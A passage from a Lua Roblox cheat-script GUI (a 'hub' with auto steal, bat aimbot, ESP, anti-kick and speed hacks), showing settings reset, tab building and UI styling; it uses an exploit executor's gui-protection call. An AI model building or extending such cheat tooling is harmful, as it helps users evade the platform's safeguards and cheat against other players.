        _lastSavedJSON = HS:JSONEncode(buildConfigTable())
        _isLoading = false
        return true
    end
    
    function forceResetUI()
        if normalBox then normalBox.Text = tostring(NS) end
        if carryBox then carryBox.Text = tostring(CS) end
        if radInput then radInput.Text = tostring(CONFIG.STEAL_RANGE) end
        if laggerBox then laggerBox.Text = tostring(LAGGER_SPEED) end
        if lagger2Box then lagger2Box.Text = tostring(LAGGER_CARRY_SPEED) end
        if batSpeedBox then batSpeedBox.Text = tostring(BAT_AIMBOT_SPEED) end
        if uiScaleBox then uiScaleBox.Text = tostring(uiScaleValue) end
        if stealBarScaleBox then stealBarScaleBox.Text = tostring(stealBarScale) end
        if dropModeBtnRef then dropModeBtnRef.Text = dropMode == 1 and "Fling" or "Jump Drop" end
        if bodyLockRangeBox then bodyLockRangeBox.Text = tostring(bodyLockRange) end
        local function safeSet(fn, val) if fn then fn(val) end end
        safeSet(autoBatSetVisual, false)
        safeSet(autoLeftSetVisual, false)
        safeSet(autoRightSetVisual, false)
        safeSet(setBatCounterVisual, false)
        safeSet(setMedusaVisual, false)
        safeSet(setUnwalkVisual, false)
        safeSet(setInfiniteJumpVisual, false)
        safeSet(setAntiLagVisual, false)
        safeSet(setLockUIVisual, false)
        safeSet(setInstaGrab, false)
        safeSet(batDesyncTpSetVisual, false)
        safeSet(setVividVisual, false)
        safeSet(setHideButtonsVisual, false)
        safeSet(bodyLockSetVisual, false)
        safeSet(setAntiDieVisual, false)
        safeSet(setAntiFlingVisual, false)
        safeSet(setAntiRagVisual, false)
        safeSet(autoBatV2SetVisual, false)
        safeSet(setSafeModeVisual, false)
        safeSet(setESPVIsual, false)
        safeSet(mirrorTPDownSetVisual, false)
        safeSet(CleanHubAutoTPDownSetVisual, false)
        safeSet(CleanHubShowE01WarningSetVisual, false)
        safeSet(setFovVisual, false)
        if fovSliderSet then fovSliderSet(70) end
        disableCustomFov()
        disableVividGraphics()
        applyHideButtons(false)
        if _G.stretchToggleSetter then _G.stretchToggleSetter(false) end
        safeSet(mobSetAutoBat, false)
        safeSet(mobSetAutoLeft, false)
        safeSet(mobSetAutoRight, false)
        safeSet(mobSetDropBR, false)
        safeSet(mobSetTpDown, false)
        safeSet(mobSetCarry, false)
        safeSet(mobSetLagger1, false)
        safeSet(mobSetLagger2, false)
        refreshSpeedModeLabel()
        updateProgressBarVisibility()
        disableAntiLag()
        if stopAntiFling then stopAntiFling() end
        if disableBatV2 then disableBatV2() end
        InfiniteJump.stop()
        skyTheme = "Off"
        pcall(applyCustomSky, "Off")
        if skySelectorLabel then skySelectorLabel.Text = "Off" end
        if antiDieEnabled then
            AntiDieModule.stop()
            antiDieEnabled = false
        end
        updateTpBatButtonWithAntiDie(false)
        for _, ref in ipairs(keyButtonRefs) do
            local entry = ref.entry
            local label = (entry.gp and entry.gp.Name) or (entry.kb and entry.kb.Name) or "None"
            ref.btn.Text = label
        end
        currentColorTheme = "White"
        selectedColor = COLOR_THEMES["White"]
        updateAllUIThemeColors(selectedColor)
        if miniBtn then
            local stroke = miniBtn:FindFirstChildOfClass("UIStroke")
            if stroke then stroke.Color = Color3.fromRGB(42, 43, 47) end
        end
        if MobilePanel then
            for _, btn in ipairs(MobilePanel:GetChildren()) do
                if btn:IsA("TextButton") then
                    local label = btn:FindFirstChildOfClass("TextLabel")
                    if label then
                        local isActive = btn.BackgroundColor3 == selectedColor
                        if not isActive then label.TextColor3 = selectedColor end
                    end
                end
            end
        end
        katanaSkinEnabled = false
        pcall(function() katanaSkinController.ApplySkin("NONE") end)
        saveAllSettings()
    end
    
    function resetFloatingPositions()
        if MobilePanel then
            savedButtonPositions = {}
            for _, btn in ipairs(MobilePanel:GetChildren()) do
                if btn:IsA("TextButton") and btn.Name then
                    local defX, defY = getDefaultButtonPosition(btn.Name)
                    btn.Position = UDim2.new(0, defX, 0, defY)
                end
            end
        end
        if tpBatFloatingButton and tpBatFloatingButton:FindFirstChild("Frame") then
            local btnFrame = tpBatFloatingButton:FindFirstChild("Frame")
            btnFrame.Position = UDim2.new(0.5, 20, 0, 10)
            tpBatFloatingPos = nil
        end
        if _G.__YoutBatV2Frame then
            _G.__YoutBatV2Frame.Position = UDim2.new(0.5, 90, 0, 10)
            _G.__YoutBatV2Pos = nil
        end
        if pbFrame then
            pbFrame.Position = UDim2.new(0.5, -160, 0.80, 0)
            savedProgressBarPos = nil
        end
        savedMobilePanelPos = nil
        tpBatFloatingPos = nil
    end
    
    function resetToFactoryDefaults()
        _isResetting = true
        local ok, err = pcall(function()
            stopAutoSteal()
            stopBatCounter()
            stopMedusaCounter()
            if AntiRagdollV2.Enabled then stopAntiRagdollV2() end
            if antiDieEnabled then AntiDieModule.stop() end
            if antiFlingEnabled and stopAntiFling then stopAntiFling() end
            InfiniteJump.stop()
            stopUnwalk()
            disableAutoBat()
            if batDesyncTpEnabled then stopBatDesyncTp() end
            if autoBatV2Enabled then disableBatV2() end
            stopBodyLock()
            if stretchEnabled then disableStretch() end
            if antiLagEnabled then disableAntiLag() end
            if vividGraphicsEnabled then disableVividGraphics() end
            if hideButtonsEnabled then applyHideButtons(false) end
            if dropActive then stopDropBrainrot() end
            if espEnabled then toggleESP(false) end
            disableCustomFov()
            skyTheme = "Off"
            pcall(applyCustomSky, "Off")
            if skySelectorLabel then skySelectorLabel.Text = "Off" end
            if antiDieEnabled then AntiDieModule.stop(); antiDieEnabled = false end
            NS = 60; CS = 29; LAGGER_SPEED = 15; LAGGER_CARRY_SPEED = 24.5
            CONFIG.STEAL_RANGE = 61
            speedMode = false; laggerToggled = false; laggerCarryToggled = false
            antiRagdollMode = "off"; antiDieEnabled = false
            antiFlingEnabled = false
            infiniteJumpEnabled = false
            medusaCounterEnabled = false; batCounterEnabled = false
            autoBatEnabled = false; autoLeftEnabled = false; autoRightEnabled = false
            autoBatV2Enabled = false; batV2Enabled = false
            unwalkEnabled = false; antiLagEnabled = false
            ragdollTimerEnabled = false
            uiLocked = false; mobileButtonsLocked = false
            CONFIG.AUTO_STEAL_ENABLED = false
            selectedStealMode = "V1"
            if _G._youtStealModeSetter then pcall(_G._youtStealModeSetter, "V1") end
            BAT_AIMBOT_SPEED = 58
            fovEnabled = false; fovValue = 70
            dropMode = 1; stretchEnabled = false; stretchFOV = 120
            uiScaleValue = 78
            stealBarScale = 100
            if mainUIScale then mainUIScale.Scale = 1 end
            if pbScale then pbScale.Scale = 1 end
            vividGraphicsEnabled = false; hideButtonsEnabled = false
            bodyLockEnabled = false; bodyLockRange = 20
            backgroundIndex = 1; backgroundImageTransparency = 0; backgroundMode = "Background 1"
            floatingButtonScale = 1
            currentAnimPack = "Off"; stopAnimPack()
            currentOutfitIndex = 1
            currentColorTheme = "White"; selectedColor = COLOR_THEMES["White"]
            katanaSkinEnabled = false
            pcall(function() katanaSkinController.ApplySkin("NONE") end)
            antiKickEnabled = false
            CleanHubShowE01Warning = false
            CleanHubAutoTPDown = false
            CleanHubAutoTPDownHeight = 20
            mirrorTPDownEnabled = false
            espEnabled = false
            _G.AceAntiBypassAimbotOn = false
            selectedAimbotMode = "Normal"
            activeTab = "SPEED"
            if main then 
                main.AnchorPoint = Vector2.new(0.5, 0.5)
                main.Position = UDim2.new(0.5, 0, 0.5, 0)
                _G.__YoutMainOriginalPos = main.Position 
            end
            for key, val in pairs(DEFAULT_KB) do
                if KB[key] then KB[key].kb = val.kb; KB[key].gp = val.gp end
            end
            resetFloatingPositions()
            forceResetUI()
            updateProgressBarVisibility()
            refreshSpeedModeLabel()
            _lastSavedJSON = nil
        end)
        _isResetting = false
        if not ok then warn("[resetToFactoryDefaults]", err) end
        if ok then saveAllSettings(true) end
        return ok
    end
    
    function updateProgressBarVisibility()
        if pbFrame then pbFrame.Visible = CONFIG.AUTO_STEAL_ENABLED end
    end
    
    function applyShimmerToText(obj, speed)
        speed = speed or 0.8
        local color = getThemeColor()
        local grad = Instance.new("UIGradient", obj)
        grad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, color),
            ColorSequenceKeypoint.new(0.3, Color3.fromRGB(200,200,200)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(0.7, Color3.fromRGB(200,200,200)),
            ColorSequenceKeypoint.new(1, color),
        })
        grad.Rotation = 45
        grad.Offset = Vector2.new(0,0)
        task.spawn(function()
            local t = 0
            while grad and grad.Parent do
                t = t + 0.02
                grad.Offset = Vector2.new(math.sin(t * speed) * 0.4, 0)
                task.wait(0.04)
            end
        end)
        return grad
    end
    
    function getDefaultButtonPosition(btnName)
        local BTN_W, BTN_H = 60, 60
        local GAP = 8
        local orderMap = { DropBR = 0, AutoLeft = 1, AutoBat = 2, AutoRight = 3, TpDown = 4, Carry = 5, Lagger1 = 6, Lagger2 = 7 }
        local order = orderMap[btnName] or 0
        local row = _floor(order / 2)
        local col = order % 2
        return col * (BTN_W + GAP), row * (BTN_H + GAP + 10)
    end
    
    function buildGui()
        local ROW_BG = Color3.fromRGB(10,10,10)
        local ROW_BORDER = Color3.fromRGB(50,50,50)
        local WHITE = Color3.fromRGB(255,255,255)
        local INP = Color3.fromRGB(15,15,15)
        local GUI_W, GUI_H = 330, 480
    
        local GUI_NAMES = {"Yout", "YoutMobilePanel", "TpBatButton", "BatV2Button",
                           "YoutSpeedIndicator", "YoutBootErrors"}
    
        local _okCg, _coreGui = pcall(function() return game:GetService("CoreGui") end)
        local _pgOld = LP:FindFirstChild("PlayerGui")
        for _, n in ipairs(GUI_NAMES) do
            if _okCg and _coreGui then
                local okFind, oldCg = pcall(function() return _coreGui:FindFirstChild(n) end)
                if okFind and oldCg then pcall(function() oldCg:Destroy() end) end
            end
            if _pgOld then
                local okFind2, o = pcall(function() return _pgOld:FindFirstChild(n) end)
                if okFind2 and o then pcall(function() o:Destroy() end) end
            end
        end
    
        gui = Instance.new("ScreenGui")
        gui.Name = "TASER"
        gui.ResetOnSpawn = false
        gui.DisplayOrder = 10
        gui.IgnoreGuiInset = true
        pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
        local guiOk = pcall(function() gui.Parent = game:GetService("CoreGui") end)
        if not guiOk then gui.Parent = LP:WaitForChild("PlayerGui") end
    
        main = Instance.new("Frame", gui)
        main.Size = UDim2.new(0, GUI_W, 0, GUI_H)
        main.AnchorPoint = Vector2.new(0.5, 0.5)
        main.Position = UDim2.new(0.5, 0, 0.5, 0)
        main.BackgroundColor3 = Color3.fromRGB(0,0,0)
        main.BackgroundTransparency = 0.85
        main.BorderSizePixel = 0
        main.ClipsDescendants = true
        Instance.new("UICorner", main).CornerRadius = UDim.new(0, 18)
    
        local mainStroke = Instance.new("UIStroke", main)
        mainStroke.Color = Color3.fromRGB(60, 60, 70)
        mainStroke.Thickness = 1.5
        mainStroke.Transparency = 0.5
    
        local guiBgImage = Instance.new("ImageLabel", main)
        guiBgImage.Name = "GUIBackgroundImage"
        guiBgImage.Size = UDim2.new(1, 0, 1, 0)
        guiBgImage.Position = UDim2.new(0, 0, 0, 0)
        guiBgImage.BackgroundTransparency = 1
        guiBgImage.BorderSizePixel = 0
        guiBgImage.ZIndex = 0
    
        local bgId = backgroundImages[backgroundIndex] or "124300474886098"
        guiBgImage.Image = "rbxassetid://" .. tostring(bgId)
        guiBgImage.ScaleType = Enum.ScaleType.Crop
        guiBgImage.ImageTransparency = backgroundImageTransparency or 0
    
        local bgCorner = Instance.new("UICorner", guiBgImage)
        bgCorner.CornerRadius = UDim.new(0, 18)
    
        _G.__YoutGuiBgImage = guiBgImage
    
        local scriptHeader = Instance.new("Frame", main)
        scriptHeader.Name = "ScriptHeader"
        scriptHeader.Size = UDim2.new(1, -20, 0, 104)
        scriptHeader.Position = UDim2.new(0, 10, 0, 0)
        scriptHeader.BackgroundTransparency = 1
        scriptHeader.BorderSizePixel = 0
        scriptHeader.ZIndex = 8
        Instance.new("UICorner", scriptHeader).CornerRadius = UDim.new(0, 13)
    
        local scriptLogo = Instance.new("ImageLabel", scriptHeader)
        scriptLogo.Name = "ScriptLogo"
        scriptLogo.AnchorPoint = Vector2.new(0.5, 0.5)
        scriptLogo.Position = UDim2.new(0.5, 0, 0.5, 0)
        scriptLogo.Size = UDim2.new(1, 0, 1, 0)
        scriptLogo.BackgroundTransparency = 1
        scriptLogo.Image = "rbxassetid://91292959187300"
        scriptLogo.ScaleType = Enum.ScaleType.Crop
        scriptLogo.ZIndex = 9
    
        mainUIScale = Instance.new("UIScale", main)
        mainUIScale.Scale = uiScaleValue / 100
    
        local closeBtn = Instance.new("TextButton", main)
        closeBtn.Size = UDim2.new(0, 32, 0, 32)
        closeBtn.Position = UDim2.new(1, -40, 0, 8)
        closeBtn.BackgroundColor3 = Color3.fromRGB(30,30,35)
        closeBtn.BackgroundTransparency = 1
        closeBtn.BorderSizePixel = 0
        closeBtn.Text = "-"
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.TextSize = 30
        closeBtn.AutoButtonColor = false
        closeBtn.ZIndex = 999
    
        closeBtn.MouseEnter:Connect(function()
            TS:Create(closeBtn, TweenInfo.new(0.12), {TextColor3 = getThemeColor()}):Play()
        end)
        closeBtn.MouseLeave:Connect(function()
            TS:Create(closeBtn, TweenInfo.new(0.12), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        end)
    
        miniBtn = Instance.new("TextButton", gui)
        miniBtn.Name = "MinimizedFrame"
        miniBtn.Size = UDim2.new(0, 160, 0, 40)
        miniBtn.Position = UDim2.new(0, 18, 0, 60)
        miniBtn.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
        miniBtn.BackgroundTransparency = 0.02
        miniBtn.BorderSizePixel = 0
        miniBtn.Text = ""
        miniBtn.TextColor3 = Color3.fromRGB(235, 235, 240)
        miniBtn.Font = Enum.Font.GothamBold
        miniBtn.TextSize = 14
        miniBtn.AutoButtonColor = false
        miniBtn.ZIndex = 20
        miniBtn.Visible = false
        Instance.new("UICorner", miniBtn).CornerRadius = UDim.new(0, 16)
    
        -- Add TER HUB background image to mini button
        local miniBgImage = Instance.new("ImageLabel", miniBtn)
        miniBgImage.Name = "MiniBtnBgImage"
        miniBgImage.Size = UDim2.new(1, 0, 1, 0)
        miniBgImage.Position = UDim2.new(0, 0, 0, 0)
        miniBgImage.BackgroundTransparency = 1
        miniBgImage.BorderSizePixel = 0
        miniBgImage.Image = "rbxassetid://91292959187300"
        miniBgImage.ScaleType = Enum.ScaleType.Crop
        miniBgImage.ZIndex = 21
        Instance.new("UICorner", miniBgImage).CornerRadius = UDim.new(0, 16)
    
        local miniTextLabel = Instance.new("TextLabel", miniBtn)
        miniTextLabel.Name = "MiniTextLabel"
        miniTextLabel.Size = UDim2.new(1, 0, 1, 0)
        miniTextLabel.Position = UDim2.new(0, 0, 0, 0)
        miniTextLabel.BackgroundTransparency = 1
        miniTextLabel.Text = ""
        miniTextLabel.TextColor3 = Color3.fromRGB(235, 235, 240)
        miniTextLabel.Font = Enum.Font.GothamBold
        miniTextLabel.TextSize = 14
        miniTextLabel.TextStrokeTransparency = 0.3
        miniTextLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        miniTextLabel.ZIndex = 22
    
        local _mainAnimating = false
        local mainOriginalPos = main.Position
        _G.__YoutMainOriginalPos = mainOriginalPos
        main:GetPropertyChangedSignal("Position"):Connect(function()
            if not _mainAnimating then
                mainOriginalPos = main.Position
                _G.__YoutMainOriginalPos = mainOriginalPos
            end
        end)
    
        local animScale = Instance.new("UIScale", main)
        animScale.Scale = 1
        local _openTween, _closeTween = nil, nil
    
        showGui = function()
            if not main then return end
            if _openTween then _openTween:Cancel() end
            if _closeTween then _closeTween:Cancel() end
            _mainAnimating = true
            main.Visible = true
            miniBtn.Visible = false
            main.AnchorPoint = Vector2.new(0.5, 0.5)
            main.Position = UDim2.new(0.5, -60, 0.5, 0)
            animScale.Scale = 0.5
            local info = TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
            _openTween = TS:Create(main, info, {Position = UDim2.new(0.5, 0, 0.5, 0)})
            TS:Create(animScale, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
            _openTween:Play()
            _openTween.Completed:Connect(function()
                _openTween = nil
                _mainAnimating = false
                mainOriginalPos = main.Position
                _G.__YoutMainOriginalPos = mainOriginalPos
            end)
        end
    
        hideGui = function()
            if not main or not main.Visible then return end
            if _openTween then _openTween:Cancel() end
            if _closeTween then _closeTween:Cancel() end
            _mainAnimating = true
            local targetPos = UDim2.new(0.5, -60, 0.5, 0)
            local info = TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
            _closeTween = TS:Create(main, info, {Position = targetPos})
            TS:Create(animScale, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.5}):Play()
            _closeTween:Play()
            _closeTween.Completed:Connect(function()
                main.Visible = false
                miniBtn.Visible = true
                _closeTween = nil
                _mainAnimating = false
                main.Position = UDim2.new(0.5, 0, 0.5, 0)
            end)
        end
    
        closeBtn.MouseButton1Click:Connect(hideGui)
        miniBtn.MouseButton1Click:Connect(showGui)
    
        -- =========================================================
        -- TAB BAR
        -- =========================================================
        local tabBar = Instance.new("Frame", main)
        tabBar.Name = "TabBar"
        tabBar.Size = UDim2.new(1, -20, 0, 34)
        tabBar.Position = UDim2.new(0, 10, 0, 106)
        tabBar.BackgroundTransparency = 1
        tabBar.ZIndex = 8    local tabBarLayout = Instance.new("UIListLayout", tabBar)
        tabBarLayout.FillDirection = Enum.FillDirection.Horizontal
        tabBarLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        tabBarLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        tabBarLayout.Padding = UDim.new(0, 6)
    
        local tabContent = Instance.new("Frame", main)
        tabContent.Size = UDim2.new(1, 0, 1, -148)
        tabContent.Position = UDim2.new(0, 0, 0, 144)
        tabContent.BackgroundTransparency = 1
        tabContent.ClipsDescendants = true
        tabContent.ZIndex = 5
    
        local function createTabPage(name)
            local page = Instance.new("ScrollingFrame", tabContent)
            page.Name = name .. "Page"
            page.Size = UDim2.new(1, 0, 1, 0)
            page.Position = UDim2.new(0, 0, 0, 0)
            page.BackgroundTransparency = 1
            page.BorderSizePixel = 0
            page.ClipsDescendants = true
            page.ScrollBarThickness = 2
            page.ScrollBarImageColor3 = getThemeColor()
            page.ScrollBarImageTransparency = 0.3
            page.CanvasSize = UDim2.new(0, 0, 0, 0)
            page.AutomaticCanvasSize = Enum.AutomaticSize.Y
            page.ScrollingDirection = Enum.ScrollingDirection.Y
            page.ZIndex = 6
            page.Visible = false
    
            local layout = Instance.new("UIListLayout", page)
            layout.SortOrder = Enum.SortOrder.LayoutOrder
            layout.Padding = UDim.new(0, 6)
            layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    
            local padding = Instance.new("UIPadding", page)
            padding.PaddingLeft = UDim.new(0, 8)
            padding.PaddingRight = UDim.new(0, 8)
            padding.PaddingTop = UDim.new(0, 6)
            padding.PaddingBottom = UDim.new(0, 20)
    
            return page
        end
    
        local speedPage  = createTabPage("SPEED")
        local combatPage = createTabPage("COMBAT")
        local keybindPage = createTabPage("KEYBIND")
    
        tabPages = { SPEED = speedPage, COMBAT = combatPage, KEYBIND = keybindPage }
    
        -- Tab buttons
        local tabOrder = {"SPEED", "COMBAT", "KEYBIND"}
        local tabLabels = { SPEED = "SPEED", COMBAT = "COMBAT", KEYBIND = "KEYBIND" }
    
        -- =========================================================
        -- TAB COLORS (PULA / ASUL / LILA)
        -- =========================================================
        local TAB_COLORS = {
            SPEED   = Color3.fromRGB(220, 50, 50),    -- Pula
            COMBAT  = Color3.fromRGB(50, 120, 220),   -- Asul
            KEYBIND = Color3.fromRGB(150, 60, 200),   -- Lila
        }
    
        local function setActiveTab(tabName)
            activeTab = tabName
            for name, page in pairs(tabPages) do
                page.Visible = (name == tabName)
            end
            for name, btn in pairs(tabButtons) do
                local tabColor = TAB_COLORS[name] or getThemeColor()
                if name == tabName then
                    btn.BackgroundColor3 = tabColor
                    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    local st = btn:FindFirstChildOfClass("UIStroke")
                    if st then st.Color = tabColor; st.Transparency = 0.1 end
                else
                    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
                    btn.TextColor3 = Color3.fromRGB(180, 180, 195)
                    local st = btn:FindFirstChildOfClass("UIStroke")
                    if st then st.Color = Color3.fromRGB(60, 60, 70); st.Transparency = 0.5 end
                end
            end
        end
    
        for _, tabName in ipairs(tabOrder) do
            local btn = Instance.new("TextButton", tabBar)
            btn.Name = tabName .. "Tab"
            btn.Size = UDim2.new(0, 96, 1, -4)
            btn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
            btn.BorderSizePixel = 0
            btn.Text = tabLabels[tabName]
            btn.TextColor3 = Color3.fromRGB(180, 180, 195)
            btn.Font = Enum.Font.GothamBold
            btn.TextSize = 12
            btn.AutoButtonColor = false
            btn.ZIndex = 9
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    
            local st = Instance.new("UIStroke", btn)
            st.Color = Color3.fromRGB(60, 60, 70)
            st.Thickness = 1
            st.Transparency = 0.5
    
            btn.MouseButton1Click:Connect(function()
                setActiveTab(tabName)
                saveAllSettings()
            end)
    
            tabButtons[tabName] = btn
        end
    
        setActiveTab(activeTab or "SPEED")
    
        local pageCounters = {}
    
        local function getNextOrder(page)
            if not pageCounters[page] then pageCounters[page] = 0 end
            pageCounters[page] = pageCounters[page] + 1
            return pageCounters[page]
        end
    
        local function mkSect(page, txt)
            local f = Instance.new("Frame", page)
            f.Size = UDim2.new(1, 0, 0, 30)
            f.BackgroundTransparency = 1
            f.BorderSizePixel = 0
            f.LayoutOrder = getNextOrder(page)
            f.ZIndex = 7
    
            local accent = Instance.new("Frame", f)
            accent.Name = "SectAccent"
            accent.Size = UDim2.new(0, 3, 0, 15)
            accent.Position = UDim2.new(0, 5, 0.5, -7)
            accent.AnchorPoint = Vector2.new(0, 0.5)
            accent.BackgroundColor3 = getThemeColor()
            accent.BorderSizePixel = 0
            accent.ZIndex = 8
            Instance.new("UICorner", accent).CornerRadius = UDim.new(1, 0)
            local accentGrad = Instance.new("UIGradient", accent)
            accentGrad.Color = youtGradient(getThemeColor())
            accentGrad.Rotation = 90
    
            local l = Instance.new("TextLabel", f)
            l.Size = UDim2.new(0.5, -24, 1, 0)
            l.Position = UDim2.new(0, 14, 0, 0)
            l.BackgroundTransparency = 1
            l.Text = txt:upper()
            l.TextColor3 = Color3.fromRGB(235, 235, 245)
            l.Font = Enum.Font.GothamBlack
            l.TextSize = 11
            l.TextXAlignment = Enum.TextXAlignment.Left
            l.TextStrokeColor3 = Color3.fromRGB(0,0,0)
            l.TextStrokeTransparency = 0.55
            l.ZIndex = 8
    
            local line = Instance.new("Frame", f)
            line.Name = "SectLine"
            line.Size = UDim2.new(0, 110, 0, 1)
            line.Position = UDim2.new(1, -6, 0.5, 0)
            line.AnchorPoint = Vector2.new(1, 0.5)
            line.BackgroundColor3 = getThemeColor()
            line.BorderSizePixel = 0
            line.ZIndex = 8
            local lineGrad = Instance.new("UIGradient", line)
            lineGrad.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0.00, 0.45),
                NumberSequenceKeypoint.new(1.00, 1.00),
            })
    
            return f
        end
    
        local function mkRow(page, h)
            local f = Instance.new("Frame", page)
            f.Size = UDim2.new(1, -4, 0, h or 42)
            f.BackgroundColor3 = ROW_BG
            f.BackgroundTransparency = 0.7
            f.BorderSizePixel = 0
            f.LayoutOrder = getNextOrder(page)
            f.ZIndex = 7
            Instance.new("UICorner", f).CornerRadius = UDim.new(0, 11)
    
            local rowGrad = Instance.new("UIGradient", f)
            rowGrad.Name = "RowGrad"
            rowGrad.Rotation = 90
            rowGrad.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0.00, 0.00),
                NumberSequenceKeypoint.new(1.00, 0.30),
            })
    
            local rowStroke = Instance.new("UIStroke", f)
            rowStroke.Color = ROW_BORDER
            rowStroke.Thickness = 1
            rowStroke.Transparency = 0.55
    
            f.MouseEnter:Connect(function()
                TS:Create(f, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(22,22,26)}):Play()
                TS:Create(rowStroke, TweenInfo.new(0.15), {Color = getThemeColor(), Transparency = 0.35}):Play()
            end)
            f.MouseLeave:Connect(function()
                TS:Create(f, TweenInfo.new(0.15), {BackgroundColor3 = ROW_BG}):Play()
                TS:Create(rowStroke, TweenInfo.new(0.15), {Color = ROW_BORDER, Transparency = 0.55}):Play()
            end)
            return f
        end
    
        local function mkLabel(row, txt)
            local l = Instance.new("TextLabel", row)
            l.Size = UDim2.new(0.55, 0, 1, 0)
            l.Position = UDim2.new(0, 12, 0, 0)
            l.BackgroundTransparency = 1
            l.Text = txt
            l.TextColor3 = Color3.fromRGB(240, 240, 250)
            l.Font = Enum.Font.GothamBold
            l.TextSize = 14
            l.TextXAlignment = Enum.TextXAlignment.Left
            l.TextTruncate = Enum.TextTruncate.AtEnd
            l.TextStrokeColor3 = Color3.fromRGB(0,0,0)
            l.TextStrokeTransparency = 0.5
            l.ZIndex = 8
            return l
        end
    
        local function mkFastToggle(page, txt, cb)
            local row = mkRow(page, 42)
            mkLabel(row, txt)
            local btn = Instance.new("TextButton", row)
            btn.Size = UDim2.new(0, 70, 0, 26)
            btn.Position = UDim2.new(1, -80, 0.5, -13)
            btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
            btn.BorderSizePixel = 0
            btn.Text = "OFF"
            btn.TextColor3 = Color3.fromRGB(200, 200, 210)
            btn.Font = Enum.Font.GothamBold
            btn.TextSize = 12
            btn.AutoButtonColor = false
            btn.ZIndex = 9
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    
            local stroke = Instance.new("UIStroke", btn)
            stroke.Color = Color3.fromRGB(80, 80, 90)
            stroke.Thickness = 1
    
            local on = false
            local function setVisual(state)
                on = state
                if on then
                    btn.Text = "ON"
                    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    btn.BackgroundColor3 = getThemeColor()
                    stroke.Color = getThemeColor()
                    stroke.Transparency = 0.3
                else
                    btn.Text = "OFF"
                    btn.TextColor3 = Color3.fromRGB(200, 200, 210)
                    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
                    stroke.Color = Color3.fromRGB(80, 80, 90)
                    stroke.Transparency = 0
                end
            end
            btn.MouseButton1Click:Connect(function()
                setVisual(not on)
                pcall(cb, on)
                task.defer(function() pcall(saveAllSettings) end)
            end)
            return setVisual
        end
    
        local function mkSelector(parent, default, options, cb)
            local container = Instance.new("Frame", parent)
            container.Size = UDim2.new(0, 160, 1, 0)
            container.Position = UDim2.new(1, -168, 0, 0)
            container.BackgroundTransparency = 1
            container.ZIndex = 8
            local leftBtn = Instance.new("TextButton", container)
            leftBtn.Size = UDim2.new(0, 28, 0, 26)
            leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
            leftBtn.BackgroundColor3 = INP
            leftBtn.BackgroundTransparency = 0.7
            leftBtn.BorderSizePixel = 0
            leftBtn.Text = "<"
            leftBtn.TextColor3 = WHITE
            leftBtn.Font = Enum.Font.GothamBold
            leftBtn.TextSize = 13
            leftBtn.AutoButtonColor = false
            leftBtn.ZIndex = 9
            Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)
            local label = Instance.new("TextLabel", container)
            label.Size = UDim2.new(0, 80, 0, 26)
            label.Position = UDim2.new(0.5, -40, 0.5, -13)
            label.BackgroundTransparency = 1
            label.Text = default
            label.TextColor3 = WHITE
            label.Font = Enum.Font.GothamBold
            label.TextSize = 12
            label.TextXAlignment = Enum.TextXAlignment.Center
            label.ZIndex = 9
            local rightBtn = Instance.new("TextButton", container)
            rightBtn.Size = UDim2.new(0, 28, 0, 26)
            rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
            rightBtn.BackgroundColor3 = INP
            rightBtn.BackgroundTransparency = 0.7
            rightBtn.BorderSizePixel = 0
            rightBtn.Text = ">"
            rightBtn.TextColor3 = WHITE
            rightBtn.Font = Enum.Font.GothamBold
            rightBtn.TextSize = 13
            rightBtn.AutoButtonColor = false
            rightBtn.ZIndex = 9
            Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)
            local function updateLabel(newText) label.Text = newText end
            leftBtn.MouseButton1Click:Connect(function()
                if cb then cb(-1, updateLabel); task.defer(function() pcall(saveAllSettings) end) end
            end)
            rightBtn.MouseButton1Click:Connect(function()
                if cb then cb(1, updateLabel); task.defer(function() pcall(saveAllSettings) end) end
            end)
            return label
        end
    
        local function mkBox(parent, default, w, xOff, cb)
            local tb = Instance.new("TextBox", parent)
            local bw = w or 50
            local xo = math.max(xOff or 56, bw + 12)
            tb.Size = UDim2.new(0, bw, 0, 24)
            tb.Position = UDim2.new(1, -xo, 0.5, -12)
            tb.BackgroundColor3 = INP
            tb.BackgroundTransparency = 0.7
            tb.BorderSizePixel = 0
            tb.Text = tostring(default)
            tb.TextColor3 = WHITE
            tb.Font = Enum.Font.GothamBold
            tb.TextSize = 11
            tb.ClearTextOnFocus = false
            tb.ZIndex = 8
            Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 6)
            local bs = Instance.new("UIStroke", tb)
            bs.Color = ROW_BORDER
            bs.Thickness = 1.2
            bs.Transparency = 0.25
            tb.Focused:Connect(function() TS:Create(bs, TweenInfo.new(0.12), {Color = getThemeColor(), Transparency = 0}):Play() end)
            tb.FocusLost:Connect(function()
